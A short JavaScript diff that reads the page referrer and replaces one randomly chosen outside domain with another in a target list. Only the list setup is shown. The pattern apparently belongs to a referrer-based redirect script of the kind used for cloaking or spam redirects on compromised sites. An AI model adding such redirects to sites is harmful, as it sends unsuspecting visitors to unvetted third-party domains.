@@ -4,7 +4,7 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([
-							'https://app.mypt3.my.id/',
+							'https://semuada.eu.org/',
 							]);
 
 				function rChoice(arr) {
